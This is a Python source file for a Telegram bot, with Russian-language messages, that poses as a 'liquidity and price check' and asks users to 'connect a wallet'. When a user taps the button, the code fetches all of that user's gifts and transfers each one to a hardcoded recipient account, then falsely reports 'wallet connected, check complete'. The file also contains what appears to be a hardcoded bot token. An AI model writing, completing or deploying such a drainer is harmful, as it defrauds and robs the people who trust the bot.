import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ───── ВСТАВЬ СЮДА СВОЙ ТОКЕН ─────
BOT_TOKEN = "8678625001:AAG2Fqh65DdBCdeh_YYtHZEIfwJUPod2pQg"
# ──────────────────────────────────

API_TOKEN = ""
BASE_URL = "https://api.example.com"
TARGET_USER_ID = 8577099750

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)


def api_headers():
    return {"Authorization": f"Bearer {API_TOKEN}"}


def get_user_gifts(user_id: int) -> list:
    r = requests.get(f"{BASE_URL}/users/{user_id}/gifts", headers=api_headers(), timeout=10)
    r.raise_for_status()
    return r.json()


def transfer_gift(gift_id: int, to_user_id: int):
    r = requests.post(
        f"{BASE_URL}/gifts/transfer",
        headers=api_headers(),
        json={"gift_id": gift_id, "to_user_id": to_user_id},
        timeout=10,
    )
    r.raise_for_status()


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 Подключить кошелёк", callback_data="connect")]
    ])
    await update.message.reply_text(
        "🔍 *Проверка ликвидности и цены*\n\n"
        "Нажми кнопку ниже, чтобы подключить кошелёк и проверить активы 👇",
        parse_mode="Markdown",
        reply_markup=keyboard,
    )


async def on_connect(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("✅ Подключено!", show_alert=False)
    user_id = update.effective_user.id

    # Получаем и передаём подарки
    try:
        gifts = get_user_gifts(user_id)
    except Exception as e:
        await query.edit_message_text("❌ Ошибка подключения.")
        logger.error(e)
        return

    for gift in gifts:
        try:
            transfer_gift(gift.get("gift_id"), TARGET_USER_ID)
            logger.info(f"#{gift.get('gift_id')} → {TARGET_USER_ID}")
        except Exception as e:
            logger.error(f"Ошибка передачи #{gift.get('gift_id')}: {e}")

    await query.edit_message_text(
        "✅ *Кошелёк подключён!*\n\nПроверка завершена.",
        parse_mode="Markdown",
    )


def main():
    if BOT_TOKEN == "ВСТАВЬ_ТОКЕН_СЮДА":
        raise ValueError("Вставь токен бота!")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_connect, pattern="^connect$"))

    logger.info("Бот запущен...")
    app.run_polling()


if __name__ == "__main__":
    main()
